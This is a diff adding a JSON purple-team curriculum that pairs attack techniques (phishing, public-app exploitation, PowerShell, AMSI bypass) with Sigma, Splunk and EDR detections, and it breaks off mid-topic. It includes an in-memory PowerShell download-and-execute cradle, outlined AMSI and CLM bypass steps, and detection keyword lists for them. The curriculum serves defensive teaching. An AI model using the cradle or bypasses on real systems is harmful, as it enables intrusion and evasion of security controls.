@@ -1,0 +1,2824 @@
+{
+  "track": "purple-team",
+  "title": "Purple Team \u2014 The Unicorn Curriculum",
+  "description": "Offense-defense fusion curriculum teaching every attack alongside its detection. The unicorn rule in practice: no technique taught without its counterpart.",
+  "modules": [
+    {
+      "id": "purple-team-foundations",
+      "title": "Purple Team Foundations \u2014 Methodology, Frameworks & Coverage Mapping",
+      "difficulty": "intermediate",
+      "prerequisites": [],
+      "objective": "Learner can plan and execute a purple team exercise end-to-end, using ATT&CK and D3FEND to map coverage gaps and track results in VECTR.",
+      "topics": [
+        {
+          "id": "purple-team-methodology",
+          "title": "What Is a Purple Team Exercise?",
+          "concepts": [
+            "Red team (offense) and blue team (defense) collaborate in real-time rather than working in silos",
+            "Purple teaming is an 'open-book exam' \u2014 both sides know the plan and improve together",
+            "Continuous feedback loop: attack then detect then analyze then improve detection then re-attack",
+            "Difference between purple teaming, red teaming, and penetration testing",
+            "VECTR platform as the central tracker for red+blue activities and ATT&CK heatmaps"
+          ],
+          "key_facts": [
+            "Traditional red team exercises can take weeks; purple team cycles can be run in days or hours",
+            "VECTR (Security Risk Advisors) is the most widely used free purple-team tracking platform",
+            "The goal is not just finding gaps but closing them with new detections in the same session"
+          ],
+          "attack_side": {
+            "technique": "Red side emulates adversary TTPs mapped to ATT&CK techniques during a planned exercise window",
+            "attack_steps": [
+              "Select target ATT&CK techniques and build emulation plan",
+              "Deploy adversary emulation tools (Atomic Red Team, CALDERA, custom payloads)",
+              "Execute technique against production or lab environment while blue team watches live",
+              "Record timestamps of each attack action for correlation with detection logs"
+            ],
+            "tools": [
+              "Atomic Red Team",
+              "CALDERA",
+              "Cobalt Strike",
+              "Empire",
+              "Prelude Operator",
+              "VECTR"
+            ],
+            "attack_techniques": [
+              "T1059",
+              "T1055",
+              "T1003",
+              "T1547"
+            ],
+            "killchain_stage": "reconnaissance"
+          },
+          "defense_side": {
+            "what_to_detect": "Blue team monitors SIEM/EDR in real-time during the exercise, attempting to detect each red action and measure detection latency",
+            "logs": [
+              "Sysmon Events 1/3/7/8/10/11/13",
+              "Windows Security 4688/4624/4672",
+              "Zeek conn/dns/http logs"
+            ],
+            "detection_rules": [
+              "Sigma rules mapped to each ATT&CK technique tested",
+              "EDR behavioral detections"
+            ],
+            "tools": [
+              "Splunk",
+              "Elastic Security",
+              "Microsoft Defender for Endpoint",
+              "Zeek",
+              "Velociraptor",
+              "VECTR"
+            ],
+            "controls": [
+              "EDR",
+              "SIEM correlation",
+              "Threat hunting"
+            ]
+          },
+          "gap_analysis": "Most organizations discover that they detect <40% of ATT&CK techniques on first exercise. Common gaps: no Sysmon deployed, PowerShell logging disabled, no network-level visibility.",
+          "drills": [
+            "Run a 1-day purple team sprint: pick 10 ATT&CK techniques, execute Atomic Red Team tests, measure detection rate, build detections for gaps, re-test."
+          ],
+          "common_mistakes": [
+            "Treating purple teaming as a one-time exercise rather than continuous practice",
+            "Not involving the blue team in planning the attack scenarios",
+            "Focusing on technique count rather than detection quality"
+          ]
+        },
+        {
+          "id": "attack-d3defend-mapping",
+          "title": "ATT&CK & D3FEND \u2014 The Offense-Defense Knowledge Graphs",
+          "concepts": [
+            "MITRE ATT&CK: taxonomy of adversary tactics, techniques, and procedures (TTPs) organized by tactics (Initial Access through Impact)",
+            "MITRE D3FEND: complementary knowledge base mapping defensive countermeasure techniques to specific offensive techniques",
+            "D3FEND organizes defenses into categories: Harden, Detect, Isolate, Deceive, Evict",
+            "ATT&CK Navigator visualizes detection coverage as a heatmap across the technique matrix",
+            "D3FEND provides formal mappings from ATT&CK mitigations to defensive technique IDs"
+          ],
+          "key_facts": [
+            "ATT&CK Enterprise matrix has 14 tactics and 600+ techniques/sub-techniques",
+            "D3FEND was first released in 2021 by MITRE with NSA sponsorship",
+            "ATT&CK Navigator supports layering: one layer for detection coverage, one for adversary group behavior, one for test coverage",
+            "DeTTECT (Detection Tactics Techniques and Coverage) is a free tool that maps detections, visibility, and adversary emulation to ATT&CK"
+          ],
+          "attack_side": {
+            "technique": "Use ATT&CK Navigator adversary group layers (e.g., APT29, FIN7) to understand which techniques real threat actors use",
+            "attack_steps": [
+              "Select a threat actor profile from ATT&CK (e.g., G0016 = APT29)",
+              "Import the group technique list into ATT&CK Navigator",
+              "Overlay this with your detection coverage layer to identify critical gaps",
+              "Prioritize emulation of techniques used by your most relevant threat actors"
+            ],
+            "tools": [
+              "ATT&CK Navigator",
+              "ATT&CK STIX data",
+              "DeTTECT",
+              "TRAM (Threat Report ATT&CK Mapper)"
+            ],
+            "attack_techniques": [
+              "T1566",
+              "T1059.001",
+              "T1003.001",
+              "T1055",
+              "T1071.001"
+            ],
+            "killchain_stage": "reconnaissance"
+          },
+          "defense_side": {
+            "what_to_detect": "Map every detection rule and log source to specific ATT&CK technique IDs, then visualize coverage gaps",
+            "logs": [
+              "All log sources tagged with ATT&CK technique IDs in SIEM"
+            ],
+            "detection_rules": [
+              "Sigma rules with tags field mapping to ATT&CK (tags: attack.t1059.001)",
+              "DeTTECT YAML visibility/detection files"
+            ],
+            "tools": [
+              "ATT&CK Navigator",
+              "DeTTECT",
+              "D3FEND CAD",
+              "MITRE TRAM"
+            ],
+            "controls": [
+              "Defense-in-depth mapping",
+              "Threat-informed defense strategy"
+            ]
+          },
+          "gap_analysis": "Coverage mapping reveals that most organizations have strong coverage in Execution and Persistence but blind spots in Collection, Exfiltration, and Defense Evasion. Prioritize gaps where threat actor techniques overlap with zero detections.",
+          "drills": [
+            "Build a complete ATT&CK Navigator layer for your organization current detection coverage. Identify the top 10 highest-risk gaps (techniques used by relevant threat actors with no detection)."
+          ],
+          "common_mistakes": [
+            "Confusing log collection with detection capability \u2014 collecting logs is not the same as having detections",
+            "Not scoring detections by confidence (a noisy rule is not real coverage)",
+            "Ignoring D3FEND entirely and only focusing on ATT&CK offense"
+          ]
+        },
+        {
+          "id": "adversary-emulation-tools",
+          "title": "Adversary Emulation Toolkit \u2014 Atomic Red Team, CALDERA, Prelude",
+          "concepts": [
+            "Atomic Red Team: library of small simple tests mapped to ATT&CK \u2014 easiest entry point for purple teaming",
+            "CALDERA: MITRE automated adversary emulation platform that chains techniques into full attack workflows using agents",
+            "Prelude Operator: adversary emulation platform with ATT&CK-mapped tests and a programmable probe",
+            "Mordor Project: pre-recorded datasets of adversarial techniques for offline detection development",
+            "Scythe and Inverno: commercial enterprise-grade adversary emulation with full reporting"
+          ],
+          "key_facts": [
+            "Atomic Red Team has 2000+ test definitions mapped to ATT&CK executable with a single command",
+            "CALDERA uses a C2 architecture with Sandcat agent and supports automated adversary profiles",
+            "Prelude Operator community edition is free and supports Windows and Linux probes",
+            "Red Canary Atomic Red Team tests are the industry standard for validating individual detections"
+          ],
+          "attack_side": {
+            "technique": "Run Atomic Red Team atomics to validate detection for specific ATT&CK techniques in a controlled manner",
+            "attack_steps": [
+              "Install Atomic Red Team (Invoke-AtomicRedTeam PowerShell module)",
+              "Select target technique (e.g., T1003.001 LSASS Memory) and run Invoke-AtomicTest T1003.001",
+              "For automated chains: deploy CALDERA Sandcat agent select adversary profile run operation",
+              "For Prelude: install probe deploy attack module execute test campaign"
+            ],
+            "tools": [
+              "Atomic Red Team",
+              "CALDERA",
+              "Prelude Operator",
+              "Mordor datasets",
+              "Cobalt Strike",
+              "Inverno"
+            ],
+            "attack_techniques": [
+              "T1003.001",
+              "T1059.001",
+              "T1547.001",
+              "T1055.001",
+              "T1566.001"
+            ],
+            "killchain_stage": "execution"
+          },
+          "defense_side": {
+            "what_to_detect": "Validate that detection rules fire correctly when known attack techniques are executed \u2014 measure if alerts were generated and with what latency",
+            "logs": [
+              "SIEM alerts",
+              "EDR console",
+              "Sysmon operational log",
+              "Windows Defender event log 1116/1117"
+            ],
+            "detection_rules": [
+              "Sigma rules for each technique being tested",
+              "EDR custom detection rules"
+            ],
+            "tools": [
+              "Splunk",
+              "Elastic SIEM",
+              "Microsoft Defender for Endpoint",
+              "Sysmon",
+              "Velociraptor"
+            ],
+            "controls": [
+              "EDR",
+              "AV/AMSI",
+              "SIEM detections",
+              "Network monitoring"
+            ]
+          },
+          "gap_analysis": "Running Atomic Red Team often reveals that detections exist but dont fire due to misconfigured log forwarding incorrect Sigma backend or EDR exclusion paths. Always verify end-to-end from test execution to SIEM alert.",
+          "drills": [
+            "Run 20 Atomic Red Team tests across 5 ATT&CK tactics. For each record whether a detection fired the time to alert and the log source that caught it. Build new detections for any that were missed."
+          ],
+          "common_mistakes": [
+            "Running atomics on production without understanding impact",
+            "Not checking that logs actually reach the SIEM before declaring a detection gap",
+            "Using only one tool \u2014 different tools generate different telemetry patterns"
+          ]
+        },
+        {
+          "id": "detection-engineering-lifecycle",
+          "title": "Detection Engineering Lifecycle \u2014 From TTP to Sigma Rule",
+          "concepts": [
+            "Detection engineering is the 6-phase lifecycle: hypothesis then develop then test then deploy then monitor then improve",
+            "Sigma: open-standard vendor-agnostic rule format for SIEM detections (like YAML for detection rules)",
+            "YARA: pattern-matching tool for identifying malware in files and memory by binary/text signatures",
+            "Detection-as-code: treat detection rules like software with version control CI/CD and automated testing",
+            "Rule lifecycle management: track false positive rate detection confidence and ATT&CK coverage over time"
+          ],
+          "key_facts": [
+            "Sigma rules are convertible to Splunk SPL Elastic KQL Microsoft KQL and 30+ backend formats using sigma-cli",
+            "YARA rules support conditions like hex strings regex and offset-based matching",
+            "A well-engineered detection includes the rule its ATT&CK mapping known false positives and a documented response procedure",
+            "Sigma rule YAML structure: title status description logsource detection selection/filter/condition level tags"
+          ],
+          "attack_side": {
+            "technique": "Analyze an attack technique behavior to understand what telemetry it generates then verify your detection catches it",
+            "attack_steps": [
+              "Study the ATT&CK technique page for procedure examples and detection recommendations",
+              "Execute the technique in a lab using Atomic Red Team or manual methods",
+              "Collect all generated logs (Sysmon Windows Event EDR network) for analysis",
+              "Identify the highest-fidelity indicator that distinguishes malicious from benign activity"
+            ],
+            "tools": [
+              "Atomic Red Team",
+              "Sysmon",
+              "Process Monitor",
+              "Wireshark",
+              "EDR lab environment"
+            ],
+            "attack_techniques": [
+              "T1059.001",
+              "T1003.001",
+              "T1547.001"
+            ],
+            "killchain_stage": "execution"
+          },
+          "defense_side": {
+            "what_to_detect": "Write a Sigma rule that matches the attack unique telemetry pattern while filtering known-good activity",
+            "logs": [
+              "Sysmon Event 1 (Process Creation)",
+              "Sysmon Event 11 (File Creation)",
+              "Windows Security 4688",
+              "PowerShell ScriptBlock 4104"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_susp_powershell_encoded_command",
+              "Sigma: proc_creation_win_mimikatz_command",
+              "YARA: rule Mimikatz_Sig { strings: $a = \"sekurlsa\" condition: $a }"
+            ],
+            "tools": [
+              "Sigma CLI",
+              "SigmaHQ rule repository",
+              "YARA",
+              "SOC Prime Uncoder",
+              "Splunk/Elastic/KQL backends"
+            ],
+            "controls": [
+              "Detection-as-code pipeline",
+              "Version control for detections (Git)",
+              "Automated detection testing"
+            ]
+          },
+          "gap_analysis": "Many detections are written but never tested against real attacks leading to rules that look correct but never fire. Always validate with adversary emulation. Common gap: Sigma rule is written but never converted to the SIEM backend.",
+          "drills": [
+            "Take T1558.003 (Kerberoasting). Execute Rubeus kerberoast in lab. Capture logs. Write a Sigma rule. Convert to your SIEM language. Verify it fires. Document false positives. Enter into Git."
+          ],
+          "common_mistakes": [
+            "Writing detections for noise rather than fidelity",
+            "Not documenting false positives and tuning instructions",
+            "Forgetting to tag rules with ATT&CK technique IDs for coverage mapping"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "initial-access-pairings",
+      "title": "Initial Access \u2014 Phishing vs. Email Security & Edge Defenses",
+      "difficulty": "intermediate",
+      "prerequisites": [
+        "purple-team-foundations"
+      ],
+      "objective": "Learner can execute phishing and exploitation attacks and build detections that catch them at the gateway endpoint and network.",
+      "topics": [
+        {
+          "id": "spearphishing-attachment-vs-email-gateway",
+          "title": "Spearphishing Attachment (T1566.001) vs. Email Security Gateway",
+          "concepts": [
+            "Phishing accounts for 40%+ of initial access incidents (Verizon DBIR 2025)",
+            "Spearphishing attachments: malicious Office documents (macro/OLE) PDFs ISO/IMG files LNK files",
+            "Modern attachment attacks use HTML smuggling or container files (zip iso vhd) to bypass MOTW",
+            "Mark-of-the-Web (MOTW): Windows zone identifier that flags files from the internet \u2014 many attacks aim to strip or bypass it",
+            "Email security layers: SPF DKIM DMARC for authentication; sandbox detonation for attachments; URL rewriting for links"
+          ],
+          "key_facts": [
+            "Median time from email delivery to first malicious action is under 60 minutes",
+            "DMARC rejection policy (p=reject) can block 80%+ of spoofed domain phishing",
+            "Office macros are disabled by default since 2022 shifting attackers to ISO/LNK/HTML smuggling",
+            "Sysmon Event 11 (FileCreate) can detect when email attachment files are written to disk"
+          ],
+          "attack_side": {
+            "technique": "Craft and deliver a spearphishing email with a malicious attachment that executes code on the victim endpoint",
+            "attack_steps": [
+              "Recon target: identify email addresses job roles and organizational context via OSINT (LinkedIn website)",
+              "Craft lure email with relevant subject and pretext (invoice HR document shared file)",
+              "Create malicious payload: macro-enabled document HTML smuggling page or ISO-embedded LNK",
+              "Deliver via email (bypassing/avoiding gateway) or via direct messaging (Teams Slack)",
+              "Payload executes on user click: downloads second-stage beacon or runs embedded shellcode"
+            ],
+            "tools": [
+              "King Phisher",
+              "Gophish",
+              "Evilginx2",
+              "Macro_Pack",
+              "Mythic"
+            ],
+            "attack_techniques": [
+              "T1566.001",
+              "T1204.002",
+              "T1027.006",
+              "T1547.009"
+            ],
+            "killchain_stage": "initial-access"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect phishing by correlating email delivery logs with subsequent suspicious process executions on endpoints",
+            "logs": [
+              "Microsoft 365 mail flow logs",
+              "Windows Security Event 4688 (Process Creation with command line)",
+              "Sysmon Event 1 (Process Creation) + Event 11 (File Create) + Event 22 (DNS Query)",
+              "Office apps alert logs"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_office_product_spawning_process (Office app spawning cmd/powershell/wscript)",
+              "Sigma: proc_creation_win_office_product_dropping_dll",
+              "Sigma: file_create_win_iso_mounting (ISO/IMG file creation from email client process)"
+            ],
+            "tools": [
+              "Microsoft Defender for Office 365",
+              "Proofpoint TAP",
+              "Abnormal Security",
+              "Sysmon",
+              "EDR"
+            ],
+            "controls": [
+              "SPF/DKIM/DMARC (p=reject)",
+              "Email sandboxing",
+              "Safe Links / URL rewriting",
+              "Macro blocking",
+              "MOTW enforcement"
+            ]
+          },
+          "gap_analysis": "HTML smuggling attacks bypass email gateways because the malicious payload is constructed client-side in the browser. ISO/IMG attachments bypass MOTW meaning SmartScreen and AppLocker may not flag them. Detect at the endpoint by monitoring for unusual process ancestry (email client then browser then shell).",
+          "drills": [
+            "Send a Gophish phishing campaign with a benign macro document. Track: did the email gateway block it? Did the sandbox detonate it? If delivered did EDR catch the macro execution? Measure detection rate at each layer."
+          ],
+          "common_mistakes": [
+            "Relying solely on the email gateway \u2014 defense in depth requires endpoint detection too",
+            "Not testing against modern attachment types (ISO HTML smuggling) that bypass traditional filtering",
+            "Forgetting to correlate email delivery time with endpoint activity for end-to-end visibility"
+          ]
+        },
+        {
+          "id": "spearphishing-link-vs-safe-links",
+          "title": "Spearphishing Link (T1566.002) vs. URL Rewriting & Safe Links",
+          "concepts": [
+            "Spearphishing links direct users to credential harvesting pages or drive-by download sites",
+            "Adversary-in-the-middle (AiTM) phishing proxies relay credentials AND MFA tokens in real-time (Evilginx Modlishka)",
+            "URL rewriting (Safe Links Proofpoint URL Defense) wraps links at delivery time for click-time evaluation",
+            "QR code phishing (quishing) embeds malicious URLs in images to bypass URL scanners",
+            "Link analysis: reputation scoring domain age redirect chains certificate transparency logs"
+          ],
+          "key_facts": [
+            "AiTM phishing can bypass MFA by relaying the session cookie after successful authentication",
+            "Newly registered domains (NRDs) are a strong phishing indicator \u2014 many appear within 24 hours of the campaign",
+            "URL rewriting only protects at click time if the backend reputation service is current",
+            "QR code phishing increased 400%+ in 2023-2024 because image-based payloads evade URL scanning"
+          ],
+          "attack_side": {
+            "technique": "Deliver a credential harvesting link via email that captures user credentials and/or bypasses MFA",
+            "attack_steps": [
+              "Register lookalike domain or compromise legitimate site for hosting",
+              "Set up credential harvesting page or AiTM reverse proxy (Evilginx2)",
+              "Craft email with embedded link using URL shortener or open-redirect to obscure destination",
+              "Victim clicks link enters credentials attacker captures or relays session token"
+            ],
+            "tools": [
+              "Evilginx2",
+              "Modlishka",
+              "Gophish",
+              "King Phisher"
+            ],
+            "attack_techniques": [
+              "T1566.002",
+              "T1557",
+              "T1185",
+              "T1078.004"
+            ],
+            "killchain_stage": "initial-access"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect credential submission to untrusted domains newly registered domains in email and AiTM proxy behavior",
+            "logs": [
+              "Email gateway URL category and reputation logs",
+              "Proxy/SWG logs showing credential submissions to external sites",
+              "Windows Event 4624 (interactive logon) from unexpected geographic locations",
+              "Azure AD sign-in logs with impossible travel patterns"
+            ],
+            "detection_rules": [
+              "Sigma: detect outbound credential submission to newly registered domain (<7 days old)",
+              "Azure Sentinel: impossible travel detection rule",
+              "Sigma: detect authentication from IP not seen in last 90 days"
+            ],
+            "tools": [
+              "Microsoft Defender for Office Safe Links",
+              "Proofpoint URL Defense",
+              "Zscaler ZIA",
+              "Cisco Umbrella",
+              "Azure AD Identity Protection"
+            ],
+            "controls": [
+              "URL rewriting at delivery",
+              "Click-time URL reputation check",
+              "Conditional Access policies (location device risk)",
+              "FIDO2 hardware security keys (resist AiTM phishing)"
+            ]
+          },
+          "gap_analysis": "AiTM phishing bypasses MFA because it steals the session token post-authentication. FIDO2/WebAuthn is the only MFA resistant to AiTM because it cryptographically binds authentication to the origin domain. Gap: many organizations have OATH TOTP which is trivially phishable.",
+          "drills": [
+            "Set up Evilginx2 in lab against a test tenant. Demonstrate MFA bypass. Then show how FIDO2 (hardware key) blocks the same attack. Write a detection for unusual session token usage patterns."
+          ],
+          "common_mistakes": [
+            "Believing MFA alone prevents phishing \u2014 TOTP/SMS MFA is bypassable with AiTM",
+            "Not monitoring for newly registered domains in email links",
+            "Ignoring QR code phishing vectors"
+          ]
+        },
+        {
+          "id": "exploit-public-app-vs-waf",
+          "title": "Exploit Public-Facing Application (T1190) vs. WAF & Patching",
+          "concepts": [
+            "Exploiting vulnerabilities in internet-facing applications (web apps VPN email servers RDP)",
+            "Common targets: Log4Shell (CVE-2021-44228) ProxyLogon (CVE-2021-26855) Citrix Bleed (CVE-2023-4966) MOVEit (CVE-2023-34362)",
+            "WAF (Web Application Firewall): inspects HTTP traffic for attack patterns (SQLi XSS RCE SSRF)",
+            "Intrusion Detection/Prevention (IDS/IPS): signature and anomaly-based network attack detection",
+            "Internet-exposed service inventory: knowing what is exposed is prerequisite to defending it"
+          ],
+          "key_facts": [
+            "Mean time to exploitation of a public CVE is often under 30 days after PoC release",
+            "CISA Known Exploited Vulnerabilities (KEV) catalog lists vulnerabilities actively exploited in the wild",
+            "Log4Shell allowed unauthenticated RCE via crafted JNDI strings in HTTP headers",
+            "60% of breach entries involve an unpatched known vulnerability"
+          ],
+          "attack_side": {
+            "technique": "Identify and exploit a vulnerability in an internet-facing application to gain initial code execution",
+            "attack_steps": [
+              "Enumerate external attack surface (Shodan Censys nmap) for exposed services and versions",
+              "Identify known vulnerabilities matching the detected versions (CVE databases ExploitDB)",
+              "Craft exploit payload (e.g., JNDI injection for Log4Shell SSRF for ProxyLogon)",
+              "Deliver payload and gain remote code execution or unauthorized access"
+            ],
+            "tools": [
+              "nmap",
+              "Nuclei",
+              "Metasploit",
+              "sqlmap",
+              "Burp Suite",
+              "Shodan"
+            ],
+            "attack_techniques": [
+              "T1190",
+              "T1059.004",
+              "T1210"
+            ],
+            "killchain_stage": "initial-access"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect exploitation attempts via WAF signatures IDS alerts and anomalous application behavior (unexpected outbound connections new processes)",
+            "logs": [
+              "WAF logs (ModSecurity Cloudflare AWS WAF) with attack signatures matched",
+              "Network IDS alerts (Suricata Snort) with CVE-specific rulesets",
+              "Web server access logs with suspicious payloads in headers/parameters",
+              "Sysmon Event 1 (new process from web server process like w3wp.exe java.exe)"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_webserver_spawning_shell (IIS/Apache/nginx spawning cmd/powershell)",
+              "Suricata ruleset: ET Open / ET Pro for known CVE exploit signatures",
+              "ModSecurity OWASP CRS rules for SQLi/XSS/RCE patterns"
+            ],
+            "tools": [
+              "Cloudflare WAF",
+              "AWS WAF",
+              "ModSecurity",
+              "Suricata",
+              "Snort",
+              "Qualys/Nessus vulnerability scanning"
+            ],
+            "controls": [
+              "WAF",
+              "IDS/IPS",
+              "Vulnerability management & patching",
+              "CISA KEV prioritization",
+              "Network segmentation",
+              "Egress filtering"
+            ]
+          },
+          "gap_analysis": "Many WAFs run in detection-only mode. Legacy applications may not support modern WAF rules. Zero-day exploits bypass signature-based IDS. Gap: organizations often lack egress monitoring to detect post-exploitation C2 beaconing from compromised web servers.",
+          "drills": [
+            "Deploy a vulnerable DVWA or Log4Shell-vulnerable app. Run Nuclei and Metasploit against it. Confirm WAF/IDS catches the attacks. Then deploy patches and re-test to confirm prevention."
+          ],
+          "common_mistakes": [
+            "Prioritizing patching by CVSS score alone rather than CISA KEV + exploitability + exposure",
+            "Running WAF in monitor-only mode indefinitely",
+            "Not scanning for shadow IT / unmanaged internet-facing assets"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "execution-pairings",
+      "title": "Execution \u2014 PowerShell & Scripting Attacks vs. AMSI, Logging & CLM",
+      "difficulty": "intermediate",
+      "prerequisites": [
+        "initial-access-pairings"
+      ],
+      "objective": "Learner can execute PowerShell-based attacks and configure the full detection stack: Script Block Logging, AMSI, CLM, and Sysmon.",
+      "topics": [
+        {
+          "id": "powershell-attacks-vs-script-block-logging",
+          "title": "PowerShell Attacks (T1059.001) vs. Script Block Logging (Event 4104)",
+          "concepts": [
+            "PowerShell is the #1 most-used execution technique by adversaries due to its ubiquity on Windows",
+            "Script Block Logging (Event 4104): logs the actual de-obfuscated code that PowerShell executes even when obfuscated at input",
+            "Script Block Logging captures code AFTER the parser and engine process it \u2014 defeating most obfuscation",
+            "Module Logging (Event 4103): logs pipeline execution details of modules",
+            "PowerShell v5+ Script Block Logging can capture AMSI bypass attempts in the log itself"
+          ],
+          "key_facts": [
+            "Enable via GPO: Computer Configuration > Admin Templates > Windows Components > PowerShell > Turn on PowerShell Script Block Logging",
+            "Event 4104 fires at script block compilation capturing the full code including decoded content",
+            "Event 4104 with level Warning indicates the script was flagged as suspicious",
+            "Event 4103 (Module Logging) must be explicitly enabled per-module"
+          ],
+          "attack_side": {
+            "technique": "Use PowerShell to execute malicious commands including obfuscated payloads downloading and running in-memory scripts",
+            "attack_steps": [
+              "Execute obfuscated PowerShell command (base64 character substitution concatenation)",
+              "Download and execute script in memory: IEX (New-Object Net.WebClient).DownloadString(url)",
+              "Invoke Reflective PE loading for in-memory DLL/EXE execution (Invoke-Mimikatz PowerView)",
+              "Use PowerShell one-liners for quick reconnaissance lateral movement and credential theft"
+            ],
+            "tools": [
+              "PowerShell Empire",
+              "PowerSploit",
+              "Invoke-Obfuscation",
+              "AmsiBypass",
+              "Covenant",
+              "Cobalt Strike"
+            ],
+            "attack_techniques": [
+              "T1059.001",
+              "T1027",
+              "T1055",
+              "T1003.001"
+            ],
+            "killchain_stage": "execution"
+          },
+          "defense_side": {
+            "what_to_detect": "Script Block Logging (Event 4104) captures the de-obfuscated code \u2014 hunt for malicious patterns in the logged script content",
+            "logs": [
+              "PowerShell Event 4104 (ScriptBlock) \u2014 Microsoft-Windows-PowerShell/Operational",
+              "PowerShell Event 4103 (Module) \u2014 pipeline execution details",
+              "Sysmon Event 1 (Process Creation) \u2014 powershell.exe with command line arguments",
+              "Windows Security Event 4688 (Process Creation with command line auditing enabled)"
+            ],
+            "detection_rules": [
+              "Sigma: posh_ps_invoke_obfuscation \u2014 detects known obfuscation patterns in script blocks",
+              "Sigma: posh_ps_suspicious_download \u2014 detects IEX/DownloadString/DownloadFile patterns",
+              "Sigma: posh_ps_mimikatz_keywords \u2014 detects Mimikatz cmdlets in script blocks",
+              "Splunk: index=powershell EventCode=4104 | search (IEX OR DownloadString OR Invoke-Mimikatz OR Add-Type)"
+            ],
+            "tools": [
+              "Splunk PowerShell TA",
+              "Elastic SIEM",
+              "Microsoft Defender for Endpoint (ASR rules)",
+              "Sysmon",
+              "PowerShell Protect"
+            ],
+            "controls": [
+              "Script Block Logging (Event 4104)",
+              "Module Logging",
+              "Transcription",
+              "AMSI",
+              "Constrained Language Mode"
+            ]
+          },
+          "gap_analysis": "Script Block Logging only captures what the PowerShell engine compiles. Attackers who call .NET APIs directly (e.g., via C# inline compilation) or use alternative PowerShell hosts may evade 4104 events. Gap: many orgs enable 4104 but dont actually monitor or alert on it.",
+          "drills": [
+            "Run 5 obfuscated PowerShell commands using Invoke-Obfuscation. Check: did Event 4104 capture the de-obfuscated code? Write Sigma rules to detect the decoded payloads. Verify rules fire in SIEM."
+          ],
+          "common_mistakes": [
+            "Enabling Script Block Logging but not forwarding Event 4104 to the SIEM",
+            "Only monitoring powershell.exe and not detecting PowerShell execution via other hosts (C# assemblies loading SMA.dll)",
+            "Not hunting in 4104 events \u2014 they contain gold but are often unused"
+          ]
+        },
+        {
+          "id": "powershell-vs-amsi-and-clm",
+          "title": "PowerShell vs. AMSI & Constrained Language Mode",
+          "concepts": [
+            "AMSI (Antimalware Scan Interface): Windows security interface that allows AV/EDR to inspect script content before execution",
+            "AMSI inspects PowerShell VBScript JavaScript and Office VBA macros at runtime",
+            "Constrained Language Mode (CLM): restricts PowerShell to basic operations \u2014 blocks COM .NET type invocation and Win32 API calls",
+            "CLM is enforced when AppLocker or WDAC (Windows Defender Application Control) is in enforce mode",
+            "AMSI + Script Block Logging + CLM form the triple threat defense for PowerShell"
+          ],
+          "key_facts": [
+            "AMSI is enabled by default on Windows 10+ with Windows Defender registered as the AMSI provider",
+            "CLM disables the ability to call Add-Type use COM objects or invoke .NET methods interactively",
+            "AMSI bypass via patching AmsiScanBuffer in memory is one of the most common attacker techniques",
+            "Script Block Logging captures the AMSI bypass attempt code in Event 4104 even if the bypass succeeds"
+          ],
+          "attack_side": {
+            "technique": "Bypass AMSI to run in-memory PowerShell payloads then execute post-exploitation tooling",
+            "attack_steps": [
+              "Attempt AMSI bypass: patch AmsiScanBuffer function to return AMSI_RESULT_CLEAN",
+              "Alternative bypasses: force AMSI error (amsiInitFailed) use reflection hardware breakpoint or load CLR before AMSI hooks",
+              "Once bypassed: execute in-memory Mimikatz download PowerSploit modules run Empire stager",
+              "If CLM is enforced: bypass via COM serialization MSBuild lateral execution or compiling to disk EXE"
+            ],
+            "tools": [
+              "AmsiBypass techniques",
+              "AmsiScanBufferBypass",
+              "Invoke-Obfuscation",
+              "AMSITrigger"
+            ],
+            "attack_techniques": [
+              "T1562.001",
+              "T1027.013",
+              "T1059.001"
+            ],
+            "killchain_stage": "defense-evasion"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect AMSI bypass attempts (memory patching error forcing) and CLM circumvention attempts",
+            "logs": [
+              "PowerShell Event 4104 (Script Block) \u2014 captures the bypass code itself even if it succeeds",
+              "Windows Defender Event 1116/1117 \u2014 malware detected by AMSI scan",
+              "Sysmon Event 1 \u2014 suspicious PowerShell process with AMSI-bypass indicators in command line",
+              "AMSI Event 800 (Microsoft-Antimalware-Scan-Interface)"
+            ],
+            "detection_rules": [
+              "Sigma: posh_ps_amsi_bypass \u2014 detects known AMSI bypass patterns in Event 4104 (AmsiScanBuffer amsiInitFailed)",
+              "Sigma: posh_ps_clm_bypass \u2014 detects Constrained Language Mode circumvention attempts",
+              "Splunk: index=powershell EventCode=4104 | search (AmsiScanBuffer OR amsiInitFailed OR System.Management.Automation.AmsiUtils)"
+            ],
+            "tools": [
+              "Windows Defender (built-in AMSI provider)",
+              "Microsoft Defender for Endpoint",
+              "Sysmon",
+              "EDR with AMSI integration",
+              "PowerShell Protect"
+            ],
+            "controls": [
+              "AMSI (enabled by default)",
+              "Constrained Language Mode via AppLocker/WDAC",
+              "Script Block Logging",
+              "ASR Rules (Attack Surface Reduction)",
+              "Tamper Protection"
+            ]
+          },
+          "gap_analysis": "AMSI bypass via memory patching is fileless and doesnt create disk artifacts. However Script Block Logging (4104) captures the bypass code itself. The real gap: many bypass techniques for CLM exist via MSBuild InstallUtil or custom .NET assemblies that dont go through the PowerShell engine at all.",
+          "drills": [
+            "Execute a known AMSI bypass. Confirm Event 4104 captured the bypass code. Write a Sigma rule to alert on it. Then enable CLM via AppLocker and show how PowerSploit modules fail. Attempt a CLM bypass and detect it."
+          ],
+          "common_mistakes": [
+            "Thinking AMSI alone stops PowerShell attacks \u2014 it only inspects content bypasses are well-documented",
+            "Not enabling CLM because of fear of breaking admin scripts (test in audit mode first)",
+            "Ignoring that the AMSI bypass attempt IS itself a high-fidelity detection signal"
+          ]
+        },
+        {
+          "id": "lolbins-vs-process-monitoring",
+          "title": "Living Off the Land Binaries (T1218) vs. Process Monitoring",
+          "concepts": [
+            "LOLBins: legitimate signed Windows binaries abused by attackers to execute code download files or bypass defenses",
+            "Key LOLBins: mshta.exe rundll32.exe regsvr32.exe certutil.exe msbuild.exe installutil.exe wmic.exe forfiles.exe",
+            "Each LOLBin has a legitimate purpose but can be used to proxy-execute malicious content (script DLL COM object)",
+            "Detection relies on process ancestry analysis: which parent spawned the LOLBin and what arguments were passed",
+            "AMSI inspects some LOLBin-launched scripts (mshta wscript) but not all"
+          ],
+          "key_facts": [
